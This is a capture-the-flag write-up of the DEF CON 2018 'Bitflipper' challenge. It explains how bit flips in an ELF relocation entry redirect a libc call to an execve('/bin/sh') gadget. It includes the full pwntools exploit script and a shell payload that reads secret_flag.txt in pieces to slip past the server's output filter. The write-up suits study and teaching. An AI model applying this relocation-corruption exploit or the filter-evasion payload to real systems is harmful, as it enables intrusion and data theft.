Bitflipper  
==========  
Type: reverse-ish, flag value: 177pt. Served at
`61421a06.quals2018.oooverflow.io:5566`.

## The wrapper

We are given access to a server that runs a packed ELF x86-64 program. Before
running the binary, it tells us:

   -------------------------------------------------------  
     Bitflipper - ELF Fault Injection Framework  
   -------------------------------------------------------  
   Test program md5:  30acc4aee186d6aef8e9e2036008a710  
   -------------------------------------------------------  
   How many faults you want to introduce?

The wrapper gives us the possibility to *"introduce faults"* in the binary
before it is run, which means flipping between 0 and 4 bits (at whichever
offset we like) in the binary. It also gives us the MD5 hash of the file,
which will be helpful to us later to make some checks.

Answering *"0"* for the number of faults to add will make the wrapper run the
program without modifying it, giving us its normal output:

	How many faults you want to introduce? 0  
	Alright, you are the boss.  
	Here is the output of the original program...  
	-------------------------------------------------------  
	README  
	abc.jpg  
	archive.zip  
	beta.doc  
	celtic.png  
	dir  
	secret_flag.txt  
	test.doc  
	version.txt

Interesting... we have a `secret_flag.txt` in the current folder.

Answering a number `n` between 1 and 4 will, on the other hand, make the
wrapper ask for `n` offsets of the `n` bits which are going to be flipped:

   How many faults you want to introduce? 2  
   That sounds like a good number  
   Which bit do you want to flip (0-81727)? 1337  
   Which bit do you want to flip (0-81727)? 31337  
   2 bits have been flipped  
   MD5 of the new version: 7b41910eb8c1512fa5e8f97f203ba58e  
   Let me run the program for you now...

We are given the MD5 hash of the modified file, then the wrapper tries to run
it and give us the output. Fiddling around with the offsets of the bits to
flip **we are very easily able to "break" the binary**. We can, for example:
**corrupt the ELF header**, make it go into segmentation fault, **tamper with
symbol relocations**, trigger a double `free()` causing a vmmap dump and
backtrace, and so on.

Making the program crash will cause the wrapper to send us an **important
hint**:

   Looks like you broke it!  
   I would send you a core dump, but I could not find any in the current
directory

Cool! This means that if we manage to **flip some bits in the ELF header to
make it become an *ELF core file*, the server will send us the entire
binary**!

Indeed, flipping bits `128`, `129` and `130`, changing the byte at offset
`0x10` from `0x03` to `0x04`, works just fine! Now we have a binary we can
disassemble and begin to work on.

## The binary

By computing the MD5 hash of the file we just got from the server we can
verify that it is indeed the same binary which is run by the wrapper server-
side. Moreover, we can now try out various combinations of bit flips and check
the new local MD5 with the remote MD5 to check if we correctly flipped the
bits.

The program itself is not really interesting: it outputs a simple sorted list
of the files in the current folder coloring their name using ANSI escape
codes. What is interesting is that by crashing the binary with a double
`free()` we can get a vmmap dump from which we can find out the `libc` version
being used:

   ...  
   7ff226ddb000-7ff226f9b000 r-xp 00000000 ca:01 1971 /lib/x86_64-linux-
gnu/libc-2.23.so  
   7ff226f9b000-7ff22719b000 ---p 001c0000 ca:01 1971 /lib/x86_64-linux-
gnu/libc-2.23.so  
   7ff22719b000-7ff22719f000 r--p 001c0000 ca:01 1971 /lib/x86_64-linux-
gnu/libc-2.23.so  
   7ff22719f000-7ff2271a1000 rw-p 001c4000 ca:01 1971 /lib/x86_64-linux-
gnu/libc-2.23.so  
   ...

We now know that it is using `libc-2.23`, and we assume the distro is, as
usual, Ubuntu 16.04.4 LTS (Xenial Xerus).

## The exploit

Now, getting into the real exploit: as said earlier, since we can modify up to
four bits at arbitrary locations in the file, if precisely calculated, **we
can corrupt an `Elf64_Rela` structure in the PLT relocation table**
(`.rela.plt`) to trick the loader into writing the address of the specified
symbol to an address (`r_offset`) in the GOT PLT (`.plt.got`), and, most
importantly, adding a given offset (`r_addend`) to the absolute address (in
the `libc`).

The `Elf64_Rela` struct is defined like this:

   typedef struct {  
       Elf64_Addr      r_offset;  
       Elf64_Xword     r_info;  
       Elf64_Sxword    r_addend;  
   } Elf64_Rela;

We now have three different approaches to modify the execution flow of the
program to fullfill our objective (which is obviously to execute a shell):

1. **Modify the index of a symbol** moving one of the functions used by the binary in another position in the PLT so that the program would call a different function instead of the expected one. Changing `r_offset` could also be possible, but harder to manage. This was not of great help since the binary doesn't use interesting functions (like `system` or similars).

2. **Modify `r_addend`** making the loader load a different function in the GOT (if it is close enough the original one). This was again not the case, since all of the "cool" `libc` functions (`system`, `execve`, `popen`, ...) were either too far or unreachable flipping only 4 bits of `r_addend` (i.e. setting only four bits to `1`).

3. **Any combination of the first two**: applying both of the above modifications for a symbol, so that calling a specific function would result in jumping in a different PLT entry than the expected one, and following the GOT entry of the latter would cause to call a totally different `libc` function than the original.

To help us identify which function could have been replaced with wich, we
wrote an helper script which did the maths for us. An example output filtered
with `grep execv` is the following (the full list was actually more than 2000
lines):

   readdir  execv  0xcc860     0b100010001000000   0 3  
   closedir execvp 0xccbc0     0b100100000000000   0 2  
   closedir execvp 0xccbc0     0b100100000000001   1 3  
   closedir execvp 0xccbc0     0b100100000000010   2 3  
   closedir execvp 0xccbc0     0b100100000000100   4 3  
   closedir execvp 0xccbc0     0b100100000001000   8 3  
   strlen  fexecve 0xcc7a0 0b1000001000010000000   0 3  
   strlen  execve  0xcc770 0b1000001000001000000 -16 3

Unfortunately none of the functions reachable by tampering an `Elf64_Rela`
structure were useful, since most of them were just random and useless
"normal" functions, and the few interesting ones (like `exec{l,ve,vpe}`) were
reachable but would have ended up being called with the wrong arguments.

We finally ran [`one_gadget`](https://github.com/david942j/one_gadget) on the
`libc-2.23` binary, discovered four useful gedgets to run `execve('/bin/sh',
NULL, NULL)` and added their address to the input of our script: three of them
were completely out of range of the possible addresses that we could make the
loader write into GOT, but one was close enough:

   opendir gadget4 0xf1147 0b101001000000000000 -7 3

which was:

   f1147: 48 8b 05 6a 2d 2d 00    mov    rax,QWORD PTR [rip+0x2d2d6a] # 3c3eb8
<__environ@@GLIBC_2.2.5-0x3080>  
   f114e: 48 8d 74 24 70          lea    rsi,[rsp+0x70]  
   f1153: 48 8d 3d fd bb 09 00    lea    rdi,[rip+0x9bbfd]            # 18cd57
<_libc_intl_domainname@@GLIBC_2.2.5+0x197>  
   f115a: 48 8b 10                mov    rdx,QWORD PTR [rax]  
   f115d: e8 0e b6 fd ff          call   cc770 <execve@@GLIBC_2.2.5>

This gadget executes `execve("/bin/sh", rsp+0x70, environ)`, so we actually
would need `rsp+0x70` to be `NULL` to be sure to not get a `SIGSEGV` or to not
call `/bin/sh some_garbage_args`, but it was well worth a try: using the third
approach explained above, **we can modify the `Elf64_Rela` struct of the
`opendir` symbol** (by flipping the bits `0x7fa*8 +1`, `+4` and `+7`), **and
make the program jump 7 bytes before the gadget** (specifically at `libc_base
+ 0xf1140`) when the tampered `opendir` function gets called.

Jumping at `0xf1140` shuffles the cards in the deck a little bit, but it
really isn't a problem:

   f1140: 24 60                   and    al,0x60  
   f1142: e8 99 67 00 00          call   f78e0 <__close@@GLIBC_2.2.5>  
   f1147: 48 8b 05 6a 2d 2d 00    mov    rax,QWORD PTR [rip+0x2d2d6a] # 3c3eb8
<__environ@@GLIBC_2.2.5-0x3080>  
   ...

As you can see, before the gedget there's a dirty little `and al,0x60`, but we
don't care about it because we have a `mov rax, <stuff>` right after wich
resets `rax`, and also a call to `__close@@GLIBC_2.2.5`: this call could
actually do something unexpected.

Anyway, running the exploit locally gave us a functioning shell, so we ran it
remotely, and... the server hangs waiting for input, **success!** Well,
actually not really: no output was being sent back to us because the call to
`__close` was closing `stdout` right before executing the shell. Not a
problem, we still have `stderr`! Now, since the remote shell is `dash`, we
first ran `bash` and then tried to run `cat secret_flag.txt >&2`, followed by
two `exit`. The wrapper complained: it had detected that we were trying to get
the content of a local file and blocked us. To circumvent this check we just
put the content of the flag in a local variable and used `echo` to write its
content splitted in three parts:

   FLAG=$(cat secret_flag.txt)  
   echo ${FLAG:0:5} >&2  
   echo ${FLAG:5:5} >&2  
   echo ${FLAG:10:5} >&2

**Ta da! Got the flag!** Here's the final output of our exploit:

   $ ./expl.py  
   [+] Opening connection to 61421a06.quals2018.oooverflow.io on port 5566:
Done  
   [+] Solving proof of work: done (359477).  
   [*] Flipping bits: 0x3fcc, 0x3fcf, 0x3fd1  
   [*] Waiting for shell to run...  
   [*] Sending payload: FLAG=$(cat secret_flag.txt)  
       echo ${FLAG:0:5} >&2  
       echo ${FLAG:5:5} >&2  
       echo ${FLAG:10:5} >&2  
   [+] Receiving all data: Done (251B)  
   [*] Closed connection to 61421a06.quals2018.oooverflow.io port 5566

   3 bits have been flipped  
   MD5 of the new version: 3e126b5008b69f13559c49657a15f5fa  
   Let me run the program for you now...  
   -------------------------------------------------------  
   bitfl  
   ip_ma  
   dness

   -------------------------------------------------------

   [+] Gottem!

Flag: `bitflip_madness`.

## Code

Code of the exploit:

```python  
#!/usr/bin/env python2

from __future__ import print_function  
from pwn import *  
from time import sleep  
import hashlib

def pow_hash(challenge, solution):  
   return hashlib.sha256(challenge.encode('ascii') +
p64(solution)).hexdigest()

def check_pow(challenge, n, solution):  
   h = pow_hash(challenge, solution)  
   return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):  
   candidate = 0  
   while not check_pow(challenge, n, candidate):  
       candidate += 1  
   return candidate

def connect_and_solve_pow():  
   conn = remote('61421a06.quals2018.oooverflow.io', 5566)  
   conn.recvuntil('Challenge: ')  
   c = conn.recvline().strip()  
   conn.recvuntil('n: ')  
   n = int(conn.recvline().strip())

   pow_progress = log.progress('Solving proof of work')  
   pow_progress.status('hang tight...')

   sol = solve_pow(c, n)  
   pow_progress.success('done (%d).', sol)  
   conn.sendline(str(sol))

   return conn

BITS_TO_FLIP = [  
   0x7f9*8 + 4,  
   0x7f9*8 + 7,  
   0x7fa*8 + 1  
]

PAYLOAD = """FLAG=$(cat secret_flag.txt)  
echo ${FLAG:0:5} >&2  
echo ${FLAG:5:5} >&2  
echo ${FLAG:10:5} >&2  
"""

r = connect_and_solve_pow()

log.info('Flipping bits: %s', ', '.join(map(hex, BITS_TO_FLIP)))  
r.recvuntil('introduce? ')

r.sendline(str(len(BITS_TO_FLIP)))

for b in BITS_TO_FLIP:  
   r.recvuntil('(0-81727)? ')  
   r.sendline(str(b))

log.info('Waiting for shell to run...')  
sleep(1)

log.info('Sending payload: %s', PAYLOAD)

r.sendline('bash')  
r.sendline(PAYLOAD)  
r.sendline('exit')  
r.sendline('exit')

output = r.recvall()

print('', output, sep='\n')

log.success('Gottem!')  
r.close()  
```

Original writeup
(https://mhackeroni.it/archive/2018/05/20/defconctfquals-2018-all-
writeups.html#bitflipper).